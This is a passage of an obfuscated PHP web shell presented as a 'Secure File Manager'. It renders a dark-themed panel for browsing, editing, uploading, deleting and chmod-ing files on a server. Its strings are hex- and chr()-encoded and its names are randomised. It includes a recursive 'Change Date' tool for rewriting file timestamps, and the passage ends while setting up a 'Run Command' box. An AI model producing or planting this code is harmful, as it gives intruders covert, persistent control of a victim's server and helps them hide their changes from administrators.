                            <a class="inline-block px-2 py-1 rounded-md border border-slate-700 text-xs <?php echo $_a3efa8 === "\x74\x78\x74" ? "\x62\x67\x2d\x69\x6e\x64\x69\x67\x6f\x2d\x36\x30\x30\x20\x74\x65\x78\x74\x2d\x77\x68\x69\x74\x65\x20\x62\x6f\x72\x64\x65\x72\x2d\x69\x6e\x64\x69\x67\x6f\x2d\x36\x30\x30" : "\x62\x67\x2d\x73\x6c\x61\x74\x65\x2d\x38\x30\x30"; ?>" href="?a=edit&f=<?php echo rawurlencode(basename($_18b9dd)); ?>&p=<?php echo rawurlencode($_2c22b0); ?>&mode=txt">Text</a>
                            <a class="inline-block px-2 py-1 rounded-md border border-slate-700 text-xs <?php echo $_a3efa8 === "\x62\x36\x34" ? "\x62\x67\x2d\x69\x6e\x64\x69\x67\x6f\x2d\x36\x30\x30\x20\x74\x65\x78\x74\x2d\x77\x68\x69\x74\x65\x20\x62\x6f\x72\x64\x65\x72\x2d\x69\x6e\x64\x69\x67\x6f\x2d\x36\x30\x30" : "\x62\x67\x2d\x73\x6c\x61\x74\x65\x2d\x38\x30\x30"; ?>" href="?a=edit&f=<?php echo rawurlencode(basename($_18b9dd)); ?>&p=<?php echo rawurlencode($_2c22b0); ?>&mode=b64">Base64</a>
                        </div>

                        <form method="post" accept-charset="UTF-8" action="?a=edit-save&p=<?php echo rawurlencode($_2c22b0); ?>" class="mt-3" id="editForm">
                            <input type="hidden" name="csrf" value="<?php echo h($_223b4a); ?>">
                            <input type="hidden" name="file" value="<?php echo h(basename($_18b9dd)); ?>">
                            <input type="hidden" name="mode" value="<?php echo h($_a3efa8); ?>">

                            <?php if ($_a3efa8 === "\x74\x78\x74"): ?>
                                <textarea id="editor" name="content"><?php echo h($_d51ee4); ?></textarea>
                            <?php
    else: ?>
                                <textarea name="content" class="w-full h-72 border border-slate-700 rounded-xl p-3 mono bg-slate-900 text-slate-100" spellcheck="false"><?php echo h($_d51ee4); ?></textarea>
                                <div class="mt-2 text-xs text-slate-400">Base64 mode: content will be decoded on save.</div>
                            <?php
    endif; ?>

                            <div class="mt-3 flex flex-wrap gap-2 items-center">
                                <button class="btn btnw" type="submit">Save</button>
                                <button class="btn btnw btn-ghost" type="button" onclick="document.getElementById('editPanel').open=false">Close</button>
                                <a class="btn btnw" href="?p=<?php echo rawurlencode($_2c22b0); ?>">Exit & Reset</a>
                                <?php if ($_a3efa8 === chr(116).chr(120).chr(116)): ?>
                                    <span class="text-xs text-slate-400">Text mode: syntax highlighting auto-detects file type.</span>
                                <?php
    endif; ?>
                            </div>
                        </form>
                    </details>
                </div>
            <?php
endif; ?>

            <?php if ($_a2e431): ?>
                <?php
    $_038460 = (int)@filesize($_a2e431);
    $_e261c4 = strtolower(pathinfo($_a2e431, PATHINFO_EXTENSION));
    $_850ee9 = in_array($_e261c4, array("\x6a\x70\x67", "\x6a\x70\x65\x67", "\x70\x6e\x67", chr(103).chr(105).chr(102), "\x77\x65\x62\x70", chr(98).chr(109).chr(112), chr(115).chr(118).chr(103)));
    $_449075 = _f6b64c028($_a2e431);
    $_1501cf = 512 * 1024; 
    $_a39d08 = '';
    if ($_449075) {
        $_a39d08 = @file_get_contents($_a2e431, false, null, 0, $_1501cf);
        if ($_a39d08 === false)
            $_a39d08 = '';
    }
?>
                <div class="card p-4" id="previewWrap">
                    <details id="previewPanel" open>
                        <summary class="cursor-pointer font-medium flex items-center justify-between">
                            <div class="flex items-center gap-2">
                                <span>Preview: <span class="mono"><?php echo h(basename($_a2e431)); ?></span></span>
                                <span class="text-xs text-slate-400">Size: <?php echo h(_fb575e97d($_038460)); ?></span>
                            </div>
                            <div class="flex items-center gap-2">
                                <button type="button" class="btn btn-xs btn-ghost" onclick="document.getElementById('previewPanel').open=false">Close</button>
                            </div>
                        </summary>

                        <div class="mt-3 text-xs text-slate-400 mono"><?php echo h($_a2e431); ?></div>

                        <div class="mt-3">
                            <?php if ($_850ee9): ?>
                                <img src="?a=raw&f=<?php echo rawurlencode(basename($_a2e431)); ?>&p=<?php echo rawurlencode($_2c22b0); ?>" alt="preview image" class="max-w-full rounded-lg border border-slate-700" style="max-height:480px;object-fit:contain;">
                            <?php
    elseif ($_449075): ?>
                                <pre id="previewPre" class="p-3 bg-black/40 rounded-lg overflow-auto text-sm mono border border-slate-700" style="max-height:480px;"><?php echo h($_a39d08); ?></pre>
                                <?php if ($_038460 > $_1501cf): ?>
                                    <div class="mt-2 text-xs text-slate-400">Showing <?php echo h(_fb575e97d($_1501cf)); ?> of <?php echo h(_fb575e97d($_038460)); ?>. Use Edit/Download for full content.</div>
                                <?php
        endif; ?>
                            <?php
    else: ?>
                                <div class="rounded-lg border border-slate-700 p-3 bg-slate-900/50">
                                    <div class="text-sm">This file type cannot be previewed directly.</div>
                                    <div class="mt-2 flex gap-2">
                                        <a class="btn btn-sm btnw" href="?a=download&f=<?php echo rawurlencode(basename($_a2e431)); ?>&p=<?php echo rawurlencode($_2c22b0); ?>">Download</a>
                                        <a class="btn btn-sm btnw" href="?a=edit&f=<?php echo rawurlencode(basename($_a2e431)); ?>&p=<?php echo rawurlencode($_2c22b0); ?>">Edit (careful if binary)</a>
                                    </div>
                                </div>
                            <?php
    endif; ?>
                        </div>
                    </details>
                </div>
            <?php
endif; ?>

            <div class="card p-4 flex flex-col" id="tableCard">
                <div class="flex items-center justify-between mb-3">
                    <h2 class="font-medium">Directory Contents</h2>
                    <div class="text-sm text-slate-400">Dirs: <?php echo count($_fff722); ?> × Files: <?php echo count($_b8b343); ?></div>
                </div>
                <div class="flex-1 flex flex-col">
                    <form method="post" action="?a=mass-delete&p=<?php echo rawurlencode($_2c22b0); ?>" id="bulkDeleteForm">
                        <input type="hidden" name="csrf" value="<?php echo h($_223b4a); ?>">
                    </form>
                    <div class="mb-3 flex flex-wrap gap-2">
                        <button form="bulkDeleteForm" class="btn btn-sm btnw" type="submit" onclick="return confirm('Delete all selected items?')">Delete Selected</button>

                        <form method="post" action="?a=mass-chmod&p=<?php echo rawurlencode($_2c22b0); ?>" class="inline-flex flex-wrap items-center gap-2" onsubmit="return prepBulkChmod(this)">
                            <input type="hidden" name="csrf" value="<?php echo h($_223b4a); ?>">
                            <input type="text" name="mode" class="field w-24 mono" placeholder="0644">
                            <label class="text-xs flex items-center gap-1 text-slate-300"><input type="checkbox" name="recursive"> rec</label>
                            <button class="btn btn-sm btnw" type="submit">Chmod Selected</button>
                        </form>

                        <button class="btn btn-sm btnw btn-ghost" type="button" onclick="selectAll(true)">Select All</button>
                        <button class="btn btn-sm btnw btn-ghost" type="button" onclick="selectAll(false)">Select None</button>

                        <div class="hidden md:flex items-center gap-2 ml-auto text-xs text-slate-400">
                            <span>Sort:</span>
                            <button type="button" class="btn btn-xs btn-ghost" onclick="sortBy('name')">Name</button>
                            <button type="button" class="btn btn-xs btn-ghost" onclick="sortBy('size')">Size</button>
                            <button type="button" class="btn btn-xs btn-ghost" onclick="sortBy('mtime')">Modified</button>
                        </div>

                        <!-- Toggle drag-to-move (default OFF) -->
                        <label class="flex items-center gap-2 text-xs text-slate-300 ml-2">
                            <input id="dragToggle" type="checkbox" class="accent-indigo-500">
                            Enable drag-to-move
                        </label>
                    </div>

                    <div class="tablewrap overflow-x-auto rounded-xl border border-slate-700 flex-1" id="dropZone">
                        <table id="dirTable" class="tbl min-w-full text-sm">
                            <thead class="text-left border-b border-slate-700">
                            <tr>
                                <th class="py-2 px-2 w-10"><input type="checkbox" id="chkAll" onclick="toggleAll(this)"></th>
                                <th class="py-2 px-2">Name</th>
                                <th class="py-2 px-2">Size</th>
                                <th class="py-2 px-2">Perms</th>
                                <th class="py-2 px-2">Owner</th>
                                <th class="py-2 px-2">Modified</th>
                                <th class="py-2 px-2">Actions</th>
                            </tr>
                            </thead>
                            <tbody id="dirBody">
                            <?php
    
    
    $_2bbf5f = dirname($_2c22b0);
    if ($_2bbf5f === "")
        $_2bbf5f = DIRECTORY_SEPARATOR;
    $_190be4 = ($_2bbf5f === $_2c22b0);
    if (!$_190be4):
?>
                                <tr class="border-b border-slate-800 hoverable" data-type="dir" data-name=".." data-size="0" data-mtime="0" data-pin="1">
                                    <td class="py-2 px-2"></td>
                                    <td class="py-2 px-2">
                                        <div class="flex items-center gap-2 text-sky-300">
                                            <?php echo _f04034bc2(chr(102).chr(111).chr(108).chr(100).chr(101).chr(114)); ?>
                                            <a class="hover:underline font-medium text-sky-300" href="?p=<?php echo rawurlencode($_2bbf5f); ?>" title="<?php echo h($_2bbf5f); ?>">..</a>
                                            <span class="badge-small">UP</span>
                                        </div>
                                    </td>
                                    <td class="py-2 px-2">-</td>
                                    <td class="py-2 px-2 mono">-</td>
                                    <td class="py-2 px-2">-</td>
                                    <td class="py-2 px-2 mono text-slate-400"><?php echo h($_2bbf5f); ?></td>
                                    <td class="py-2 px-2"></td>
                                </tr>
                            <?php endif; ?>
                            <?php foreach ($_fff722 as $_bc4c7b):
    $_3e9f1a = $_2c22b0 . DIRECTORY_SEPARATOR . $_bc4c7b;
    $_ab6f7c = @is_readable($_3e9f1a);
    $_16a1d4 = @is_writable($_3e9f1a);
    $_f986ed = (int)@filemtime($_3e9f1a);
    $_f3dc41 = $_16a1d4 ? chr(116).chr(101).chr(120).chr(116).chr(45).chr(108).chr(105).chr(109).chr(101).chr(45).chr(52).chr(48).chr(48) : ($_ab6f7c ? "\x74\x65\x78\x74\x2d\x77\x68\x69\x74\x65" : chr(116).chr(101).chr(120).chr(116).chr(45).chr(114).chr(101).chr(100).chr(45).chr(52).chr(48).chr(48));
?>
                                <tr class="border-b border-slate-800 hoverable"
                                    data-type="dir"
                                    data-name="<?php echo h(strtolower($_bc4c7b)); ?>"
                                    data-size="0"
                                    data-mtime="<?php echo $_f986ed; ?>"
                                    draggable="true"
                                    ondragstart="onDragStartItem(event, <?php echo je($_bc4c7b); ?>)"
                                    ondragover="onDragOverDir(event)"
                                    ondragleave="onDragLeaveDir(event)"
                                    ondrop="onDropToDir(event, <?php echo je($_bc4c7b); ?>)">
                                    <td class="py-2 px-2"><input form="bulkDeleteForm" class="rowchk" type="checkbox" name="items[]" value="<?php echo h($_bc4c7b); ?>"></td>
                                    <td class="py-2 px-2">
                                        <div class="flex items-center gap-2 <?php echo $_f3dc41; ?>">
                                            <?php echo _f04034bc2("\x66\x6f\x6c\x64\x65\x72"); ?>
                                            <a class="hover:underline font-medium text-white"
                                               draggable="false"
                                               onclick="return guardLinkCopy(event)"
                                               href="?p=<?php echo rawurlencode($_3e9f1a); ?>"><?php echo h($_bc4c7b); ?></a>
                                            <span class="badge-small">DIR</span>
                                        </div>
                                    </td>
                                    <td class="py-2 px-2">-</td>
                                    <td class="py-2 px-2 mono <?php echo $_f3dc41; ?>"><?php echo h(_f592888d3($_3e9f1a)); ?></td>
                                    <td class="py-2 px-2"><?php echo h(_f84eed38e($_3e9f1a)); ?></td>
                                    <td class="py-2 px-2"><?php echo h(date("\x59\x2d\x6d\x2d\x64\x20\x48\x3a\x69\x3a\x73", $_f986ed ?: time())); ?></td>
                                    <td class="py-2 px-2">
                                        <div class="row-actions">
                                            <span class="btn btn-xs btnw" style="opacity:.35; pointer-events:none;">Edit</span>
                                            <span class="btn btn-xs btnw" style="opacity:.35; pointer-events:none;">Download</span>

                                            <button type="button" class="btn btn-xs btnw" onclick="toggleRow('rn-<?php echo h($_bc4c7b); ?>')">Rename</button>
                                            <button type="button" class="btn btn-xs btnw" onclick="toggleRow('cm-<?php echo h($_bc4c7b); ?>')">Chmod</button>
                                            <button type="button" class="btn btn-xs btnw" onclick="toggleRow('mt-<?php echo h($_bc4c7b); ?>')">Change Date</button>

                                            <form method="post" action="?a=delete&p=<?php echo rawurlencode($_2c22b0); ?>" onsubmit="return confirm('Delete this directory (recursive)?')" class="inline">
                                                <input type="hidden" name="csrf" value="<?php echo h($_223b4a); ?>">
                                                <input type="hidden" name="target" value="<?php echo h($_bc4c7b); ?>">
                                                <button class="btn btn-xs btnw" type="submit">Delete</button>
                                            </form>
                                        </div>

                                        <div id="rn-<?php echo h($_bc4c7b); ?>" class="hidden mt-2">
                                            <form method="post" action="?a=rename&p=<?php echo rawurlencode($_2c22b0); ?>" class="flex flex-wrap gap-2">
                                                <input type="hidden" name="csrf" value="<?php echo h($_223b4a); ?>">
                                                <input type="hidden" name="old" value="<?php echo h($_bc4c7b); ?>">
                                                <input type="text" name="new" class="field w-48" placeholder="New name" value="<?php echo h($_bc4c7b); ?>">
                                                <button class="btn btn-sm btnw" type="submit">OK</button>
                                                <button class="btn btn-sm btnw btn-ghost" type="button" onclick="closeAction(this)">Cancel</button>
                                            </form>
                                        </div>

                                        <div id="cm-<?php echo h($_bc4c7b); ?>" class="hidden mt-2">
                                            <form method="post" action="?a=chmod&p=<?php echo rawurlencode($_2c22b0); ?>" class="flex flex-wrap gap-2 items-center">
                                                <input type="hidden" name="csrf" value="<?php echo h($_223b4a); ?>">
                                                <input type="hidden" name="target" value="<?php echo h($_bc4c7b); ?>">
                                                <input type="text" name="mode" class="field w-28 mono" placeholder="0755">
                                                <label class="text-xs flex items-center gap-1"><input type="checkbox" name="recursive"> recursive</label>
                                                <button class="btn btn-sm btnw" type="submit">OK</button>
                                                <button class="btn btn-sm btnw btn-ghost" type="button" onclick="closeAction(this)">Cancel</button>
                                            </form>
                                        </div>

                                        <div id="mt-<?php echo h($_bc4c7b); ?>" class="hidden mt-2">
                                            <form method="post" action="?a=mtime&p=<?php echo rawurlencode($_2c22b0); ?>" class="flex flex-wrap gap-2 items-center">
                                                <input type="hidden" name="csrf" value="<?php echo h($_223b4a); ?>">
                                                <input type="hidden" name="target" value="<?php echo h($_bc4c7b); ?>">
                                                <input type="text" name="ts" class="field w-56 mono" placeholder="YYYY-MM-DD HH:MM:SS or epoch" required>
                                                <label class="text-xs flex items-center gap-1"><input type="checkbox" name="recursive" checked> recursive</label>
                                                <button class="btn btn-sm btnw" type="submit">OK</button>
                                                <button class="btn btn-sm btnw btn-ghost" type="button" onclick="closeAction(this)">Cancel</button>
                                            </form>
                                        </div>
                                    </td>
                                </tr>
                            <?php
endforeach; ?>

                            <?php foreach ($_b8b343 as $_bc4c7b):
    $_3e9f1a = $_2c22b0 . DIRECTORY_SEPARATOR . $_bc4c7b;
    $_4ad210 = (int)@filesize($_3e9f1a);
    $_f986ed = (int)@filemtime($_3e9f1a);
    $_337bff = strtolower(pathinfo($_3e9f1a, PATHINFO_EXTENSION));
    $_ab6f7c = @is_readable($_3e9f1a);
    $_16a1d4 = @is_writable($_3e9f1a);
    $_f3dc41 = $_16a1d4 ? chr(116).chr(101).chr(120).chr(116).chr(45).chr(108).chr(105).chr(109).chr(101).chr(45).chr(52).chr(48).chr(48) : ($_ab6f7c ? chr(116).chr(101).chr(120).chr(116).chr(45).chr(119).chr(104).chr(105).chr(116).chr(101) : "\x74\x65\x78\x74\x2d\x72\x65\x64\x2d\x34\x30\x30");
?>
                                <tr class="border-b border-slate-800 hoverable"
                                    data-type="file"
                                    data-name="<?php echo h(strtolower($_bc4c7b)); ?>"
                                    data-size="<?php echo $_4ad210; ?>"
                                    data-mtime="<?php echo $_f986ed; ?>"
                                    draggable="true"
                                    ondragstart="onDragStartItem(event, <?php echo je($_bc4c7b); ?>)">
                                    <td class="py-2 px-2"><input form="bulkDeleteForm" class="rowchk" type="checkbox" name="items[]" value="<?php echo h($_bc4c7b); ?>"></td>
                                    <td class="py-2 px-2">
                                        <div class="flex items-center gap-2 <?php echo $_f3dc41; ?>">
                                            <?php echo _f05360a54($_3e9f1a); ?>
                                            <a class="font-medium hover:underline text-white"
                                               draggable="false"
                                               onclick="return guardLinkCopy(event)"
                                               href="?a=view&f=<?php echo rawurlencode($_bc4c7b); ?>&p=<?php echo rawurlencode($_2c22b0); ?>">
                                                <?php echo h($_bc4c7b); ?>
                                            </a>
                                        </div>
                                    </td>
                                    <td class="py-2 px-2 mono"><?php echo h(_fb575e97d($_4ad210)); ?></td>
                                    <td class="py-2 px-2 mono <?php echo $_f3dc41; ?>"><?php echo h(_f592888d3($_3e9f1a)); ?></td>
                                    <td class="py-2 px-2"><?php echo h(_f84eed38e($_3e9f1a)); ?></td>
                                    <td class="py-2 px-2"><?php echo h(date(chr(89).chr(45).chr(109).chr(45).chr(100).chr(32).chr(72).chr(58).chr(105).chr(58).chr(115), $_f986ed ?: time())); ?></td>
                                    <td class="py-2 px-2">
                                        <div class="row-actions">
                                            <a class="btn btn-xs btnw" href="?a=edit&f=<?php echo rawurlencode($_bc4c7b); ?>&p=<?php echo rawurlencode($_2c22b0); ?>">Edit</a>
                                            <?php $_5e304b = _f7c10a612($_3e9f1a); if ($_5e304b !== null): ?>
                                            <a class="btn btn-xs btnw" href="<?php echo h($_5e304b); ?>" target="_blank" rel="noopener">Open</a>
                                            <?php endif; ?>
                                            <a class="btn btn-xs btnw" href="?a=download&f=<?php echo rawurlencode($_bc4c7b); ?>&p=<?php echo rawurlencode($_2c22b0); ?>">Download</a>

                                            <button type="button" class="btn btn-xs btnw" onclick="toggleRow('rn-<?php echo h($_bc4c7b); ?>')">Rename</button>
                                            <button type="button" class="btn btn-xs btnw" onclick="toggleRow('cm-<?php echo h($_bc4c7b); ?>')">Chmod</button>
                                            <button type="button" class="btn btn-xs btnw" onclick="toggleRow('mt-<?php echo h($_bc4c7b); ?>')">Change Date</button>

                                            <?php if (in_array($_337bff, array("\x7a\x69\x70")) || preg_match("\x7e\x5c\x2e\x28\x74\x61\x72\x7c\x74\x61\x72\x5c\x2e\x67\x7a\x7c\x74\x61\x72\x5c\x2e\x62\x7a\x32\x7c\x74\x61\x72\x5c\x2e\x78\x7a\x29\x24\x7e\x69", $_bc4c7b)): ?>
                                                <form method="post" action="?a=unzip&p=<?php echo rawurlencode($_2c22b0); ?>" class="inline">
                                                    <input type="hidden" name="csrf" value="<?php echo h($_223b4a); ?>">
                                                    <input type="hidden" name="file" value="<?php echo h($_bc4c7b); ?>">
                                                    <button class="btn btn-xs btnw" type="submit">Unzip here</button>
                                                </form>
                                            <?php
    endif; ?>

                                            <form method="post" action="?a=delete&p=<?php echo rawurlencode($_2c22b0); ?>" class="inline" onsubmit="return confirm('Delete this file?')">
                                                <input type="hidden" name="csrf" value="<?php echo h($_223b4a); ?>">
                                                <input type="hidden" name="target" value="<?php echo h($_bc4c7b); ?>">
                                                <button class="btn btn-xs btnw" type="submit">Delete</button>
                                            </form>
                                        </div>

                                        <div id="rn-<?php echo h($_bc4c7b); ?>" class="hidden mt-2">
                                            <form method="post" action="?a=rename&p=<?php echo rawurlencode($_2c22b0); ?>" class="flex flex-wrap gap-2 mt-1">
                                                <input type="hidden" name="csrf" value="<?php echo h($_223b4a); ?>">
                                                <input type="hidden" name="old" value="<?php echo h($_bc4c7b); ?>">
                                                <input type="text" name="new" class="field w-48" placeholder="New name" value="<?php echo h($_bc4c7b); ?>">
                                                <button class="btn btn-sm btnw" type="submit">OK</button>
                                                <button class="btn btn-sm btnw btn-ghost" type="button" onclick="closeAction(this)">Cancel</button>
                                            </form>
                                        </div>

                                        <div id="cm-<?php echo h($_bc4c7b); ?>" class="hidden mt-2">
                                            <form method="post" action="?a=chmod&p=<?php echo rawurlencode($_2c22b0); ?>" class="flex flex-wrap gap-2 items-center mt-1">
                                                <input type="hidden" name="csrf" value="<?php echo h($_223b4a); ?>">
                                                <input type="hidden" name="target" value="<?php echo h($_bc4c7b); ?>">
                                                <input type="text" name="mode" class="field w-24 mono" placeholder="0644">
                                                <label class="text-xs flex items-center gap-1"><input type="checkbox" name="recursive"> recursive</label>
                                                <button class="btn btn-sm btnw" type="submit">OK</button>
                                                <button class="btn btn-sm btnw btn-ghost" type="button" onclick="closeAction(this)">Cancel</button>
                                            </form>
                                        </div>

                                        <div id="mt-<?php echo h($_bc4c7b); ?>" class="hidden mt-2">
                                            <form method="post" action="?a=mtime&p=<?php echo rawurlencode($_2c22b0); ?>" class="flex flex-wrap gap-2 items-center">
                                                <input type="hidden" name="csrf" value="<?php echo h($_223b4a); ?>">
                                                <input type="hidden" name="target" value="<?php echo h($_bc4c7b); ?>">
                                                <input type="text" name="ts" class="field w-56 mono" placeholder="YYYY-MM-DD HH:MM:SS or epoch" required>
                                                <label class="text-xs flex items-center gap-1 opacity-50"><input type="checkbox" disabled> recursive</label>
                                                <button class="btn btn-sm btnw" type="submit">OK</button>
                                                <button class="btn btn-sm btnw btn-ghost" type="button" onclick="closeAction(this)">Cancel</button>
                                            </form>
                                        </div>

                                    </td>
                                </tr>
                            <?php
endforeach; ?>

                            <?php if (empty($_fff722) && empty($_b8b343)): ?>
                                <tr><td colspan="7" class="py-6 text-center text-slate-400">Empty</td></tr>
                            <?php
endif; ?>

                            </tbody>
                        </table>
                    </div>
                    <!-- below the table -->
                    <div class="mt-3">
                        <form method="post"
                              action="?a=zip&p=<?php echo rawurlencode($_2c22b0); ?>"
                              class="inline-flex flex-wrap gap-2 items-center">
                            <input type="hidden" name="csrf" value="<?php echo h($_223b4a); ?>">
                            <input type="text" name="zipname" class="field w-56" placeholder="archive-name.zip (optional)">
                            <button class="btn btn-sm btnw" type="submit" onclick="return collectSelectedInto(this.form)">Zip Selected</button>
                            <span class="text-xs text-slate-400">
                If ZipArchive is unavailable, a <span class="mono">.tar</span> will be created (no compression).
              </span>
                        </form>
                    </div>
                </div>
            </div>
        </section>
    </main>

    <!-- Footer -->
    <footer class="w-full px-6 py-4">
        <div class="footer-line mb-3"></div>
        <div class="text-xs text-slate-400 flex items-center justify-between">
            <span>© <?php echo $_f0eef3; ?> BLUE — Secure File Manager. All rights reserved.</span>
            <span>Built with ❤️ & Tailwind · Dark UI</span>
        </div>
    </footer>

    <script>
        document.documentElement.classList.add('dark');

        // Don't navigate when text is selected (so the <a> is easy to copy)
        function guardLinkCopy(e){
            var sel = '';
            if (window.getSelection) sel = String(window.getSelection());
            if (sel && sel.length > 0){
                e.preventDefault();
                return false;
            }
            return true;
        }

        // Search filter
        const searchEl = document.getElementById('searchBox');
        function filterRows(){
            const q = (searchEl && searchEl.value || '').trim().toLowerCase();
            const rows = document.querySelectorAll('#dirBody tr');
            rows.forEach(function(r){
                if(r.getAttribute('data-pin')){ r.style.display = ''; return; } // ".." always visible
                var name = r.getAttribute('data-name')||'';
                r.style.display = name.indexOf(q) !== -1 ? '' : 'none';
            });
        }
        window.addEventListener('keydown', function(e){ if(e.ctrlKey && e.key === '/'){ e.preventDefault(); if(searchEl){searchEl.focus();} } });

        // Sort
        var sortState = { key:'name', asc:true };
        function sortBy(key){
            var body = document.getElementById('dirBody');
            var allRows = Array.prototype.slice.call(body.querySelectorAll('tr'));
            var pinned = allRows.filter(function(r){ return r.getAttribute('data-pin'); }); // ".." stays on top
            var rows = allRows.filter(function(r){ return !r.getAttribute('data-pin'); });
            var factor = (sortState.key===key && sortState.asc)?-1:1;
            sortState = { key: key, asc: factor===1 };
            rows.sort(function(a,b){
                if(key==='name'){ return a.dataset.name.localeCompare(b.dataset.name) * factor; }
                if(key==='size' || key==='mtime'){
                    var av = parseInt(a.dataset[key]||'0',10);
                    var bv = parseInt(b.dataset[key]||'0',10);
                    return (av-bv) * factor;
                }
                return 0;
            });
            pinned.forEach(function(r){ body.appendChild(r); });
            rows.forEach(function(r){ body.appendChild(r); });
        }

        // Checkboxes
        function toggleAll(master){ Array.prototype.forEach.call(document.querySelectorAll('.rowchk'), function(x){ x.checked = master.checked; }); }
        function selectAll(flag){ Array.prototype.forEach.call(document.querySelectorAll('.rowchk'), function(x){ x.checked = !!flag; }); var m=document.getElementById('chkAll'); if(m) m.checked=!!flag; }
        function toggleRow(id){ var el=document.getElementById(id); if(el) el.classList.toggle('hidden'); }
        function closeAction(btn){ var holder = btn.closest('div[id^="rn-"], div[id^="cm-"], div[id^="mt-"]'); if(holder) holder.classList.add('hidden'); }

        // Collect selected items for Zip form
        function collectSelectedInto(form){
            Array.prototype.forEach.call(form.querySelectorAll('input[name="items[]"]'), function(n){ n.parentNode.removeChild(n); });
            Array.prototype.forEach.call(document.querySelectorAll('#dirBody .rowchk:checked'), function(chk){
                var i = document.createElement('input');
                i.type='hidden'; i.name='items[]'; i.value=chk.value;
                form.appendChild(i);
            });
            return true;
        }

        // Bulk chmod on selected items
        function prepBulkChmod(form){
            var sel = document.querySelectorAll('#dirBody .rowchk:checked');
            if(!sel.length){ alert('No items selected.'); return false; }
            var modeEl = form.querySelector('input[name="mode"]');
            var mode = (modeEl && modeEl.value || '').trim();
            if(!mode){ alert('Enter a permission mode (e.g. 0644).'); if(modeEl) modeEl.focus(); return false; }
            if(!confirm('Apply chmod '+mode+' to '+sel.length+' selected item(s)?')) return false;
            collectSelectedInto(form);
            return true;
        }

        // ===== Drag & Drop Upload =====
        var dropZone = document.getElementById('dropZone');
        var tableCard = document.getElementById('tableCard');
        var csrf = <?php echo je($_223b4a); ?>;
        var currentPath = <?php echo je($_2c22b0); ?>;

        ['dragenter','dragover'].forEach(function(ev){
            document.addEventListener(ev, function(e){ e.preventDefault(); e.stopPropagation(); tableCard.classList.add('drop-hint'); });
        });
        ['dragleave','drop'].forEach(function(ev){
            document.addEventListener(ev, function(e){
                if(ev==='dragleave' && e.target !== document) return;
                tableCard.classList.remove('drop-hint');
            });
        });
        document.addEventListener('drop', function(e){
            if(!e.dataTransfer || !e.dataTransfer.files || e.dataTransfer.files.length===0) return;
            e.preventDefault(); e.stopPropagation();
            try{
                var fd = new FormData();
                fd.append('csrf', csrf);
                for(var i=0;i<e.dataTransfer.files.length;i++){ var f=e.dataTransfer.files[i]; fd.append('files[]', f, f.name); }
                fetch('?a=upload&p='+encodeURIComponent(currentPath), { method:'POST', body:fd })
                    .then(function(){ location.href='?p='+encodeURIComponent(currentPath); })
                    .catch(function(){ alert('Upload failed'); });
            }catch(err){ console.error(err); alert('Upload failed'); }
        });

        // ===== Drag to Move between directories (copy-friendly by default) =====
        var draggedItemName = null;
        var dragEnabled = false; // DEFAULT OFF -> table is easy to copy

        // Toggle handler
        (function(){
            var dt = document.getElementById('dragToggle');
            if (dt) {
                dragEnabled = !!dt.checked;
                dt.addEventListener('change', function(){
                    dragEnabled = !!dt.checked;
                });
            }
        })();

        function onDragStartItem(ev, name){
            if (!dragEnabled) {
                ev.preventDefault();
                return false;
            }
            draggedItemName = name; ev.dataTransfer.setData('text/plain', name);
            ev.dataTransfer.effectAllowed = 'move';
        }
        function onDragOverDir(ev){
            if (!dragEnabled) return;
            ev.preventDefault(); ev.currentTarget.classList.add('droptarget');
            ev.dataTransfer.dropEffect = 'move';
        }
        function onDragLeaveDir(ev){
            ev.currentTarget.classList.remove('droptarget');
        }
        function onDropToDir(ev, dirName){
            if (!dragEnabled) return;
            ev.preventDefault();
            var row = ev.currentTarget; row.classList.remove('droptarget');
            var src = draggedItemName || ev.dataTransfer.getData('text/plain');
            if(!src) return;
            try{
                var fd = new FormData();
                fd.append('csrf', csrf);
                fd.append('src', src);
                var dstAbs = <?php echo je($_2c22b0 . DIRECTORY_SEPARATOR); ?> + dirName;
                fd.append('dst', dstAbs);
                fetch('?a=move&p='+encodeURIComponent(currentPath), { method:'POST', body:fd })
                    .then(function(){ location.href='?p='+encodeURIComponent(currentPath); })
                    .catch(function(){ alert('Move failed'); });
            }catch(err){ console.error(err); alert('Move failed'); }
        }

        // ===== CodeMirror Init (file editor text mode) =====
        <?php if ($_18b9dd && $_a3efa8 === chr(116).chr(120).chr(116)): ?>
        (function(){
            var ta = document.getElementById('editor'); if (!ta) return;
            var filename = <?php echo je(basename($_18b9dd)); ?>;
            CodeMirror.modeURL = "https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/%N/%N.min.js";
            var info = CodeMirror.findModeByFileName(filename) || CodeMirror.findModeByMIME('text/plain');
            var cm = CodeMirror.fromTextArea(ta, {
                lineNumbers:true, styleActiveLine:true, matchBrackets:true, autoCloseBrackets:true,
                lineWrapping:true, theme:'material-darker',
                mode: (info && info.mime) ? info.mime : 'text/plain',
                viewportMargin: Infinity
            });
            if (info && info.mode) { CodeMirror.autoLoadMode(cm, info.mode); }
            var det = document.getElementById('editPanel'); if(det){ det.addEventListener('toggle', function(){ setTimeout(function(){cm.refresh();},50); }); }
            var form = document.getElementById('editForm'); if(form){ form.addEventListener('submit', function(){ cm.save(); }); }
        })();
        <?php
endif; ?>

        // ===== CodeMirror for PREVIEW (readonly, auto-detect) =====
        (function(){
            var pre = document.getElementById('previewPre');
            if(!pre || typeof CodeMirror === 'undefined') return;

            CodeMirror.modeURL = "https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/%N/%N.min.js";
            var filename = <?php echo je($_a2e431 ? basename($_a2e431) : ''); ?>;
            var info = (filename && CodeMirror.findModeByFileName(filename)) || CodeMirror.findModeByMIME('text/plain');

            var textValue = pre.textContent || '';
            var holder = document.createElement('div');
            pre.parentNode.replaceChild(holder, pre);

            var cmPrev = CodeMirror(holder, {
                value: textValue,
                readOnly: true,
                lineNumbers: true,
                lineWrapping: true,
                theme: 'material-darker',
                mode: (info && info.mime) ? info.mime : 'text/plain',
                viewportMargin: Infinity
            });

            if (info && info.mode) CodeMirror.autoLoadMode(cmPrev, info.mode);
            cmPrev.setSize('100%', 480);

            var det = document.getElementById('previewPanel');
            if (det) det.addEventListener('toggle', function(){ setTimeout(function(){ cmPrev.refresh(); }, 50); });
            window.addEventListener('resize', function(){ cmPrev.refresh(); });
        })();

        // ===== CodeMirror for RUN COMMAND (single-line + placeholder) =====
        (function(){
            var ta = document.getElementById('cmdTA');
            if(!ta || typeof CodeMirror === 'undefined') return;

            CodeMirror.modeURL = "https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/%N/%N.min.js";
